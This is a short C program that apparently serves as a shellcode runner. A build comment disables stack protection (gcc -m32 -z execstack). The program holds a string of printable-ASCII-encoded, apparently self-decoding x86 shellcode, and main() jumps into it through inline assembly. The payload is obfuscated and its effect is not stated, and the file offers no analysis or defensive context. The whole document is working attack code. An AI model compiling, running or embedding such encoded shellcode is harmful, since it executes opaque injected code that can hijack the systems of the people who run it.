/* Compile using:
 *    gcc -m32 -z execstack -o run run.c
 */

#include <stdio.h>

char shellcode[] = "\x60\x50\x59\x6A\x30\x58\x34\x30\x48\x50\x5B\x6A\x30\x58\x30\x59\x35\x30\x41\x4F\x30\x59\x4F\x30\x59\x60\x30\x41\x61\x30\x59\x61\x30\x41\x62\x30\x59\x69\x30\x41\x6A\x30\x59\x6A\x30\x41\x6B\x30\x59\x6D\x30\x59\x6E\x72\x49\x49\x30\x59\x37\x30\x41\x38\x30\x59\x38\x30\x41\x39\x30\x59\x3D\x30\x59\x3E\x30\x59\x47\x51\x5A\x4F\x79\x49\x26\x74\x3C\x6A\x30\x58\x34\x30\x50\x5B\x32\x59\x49\x43\x3F\x2C\x34\x32\x41\x4A\x40\x24\x3C\x3F\x27\x32\x30\x27\x77\x42\x49\x6A\x30\x58\x34\x30\x50\x5B\x32\x59\x4A\x43\x32\x41\x4B\x40\x3F\x2C\x36\x24\x3F\x30\x27\x77\x42\x4A\x42\x42\x41\x41\x41\x75\x41\x61\x42\x46\x48\x45\x67\x4A\x44\x60\x50\x45\x5F\x6E\x41\x7C\x72\x45\x60\x67\x41\x7C\x61\x45\x64\x6D\x47\x66\x62\x4B\x75\x3F\x26";

int main(int argc, char *argv[]) {
	asm("mov %0, %%eax;"
	    "call *%%eax"
	    :
	    : "r"(shellcode) );
}
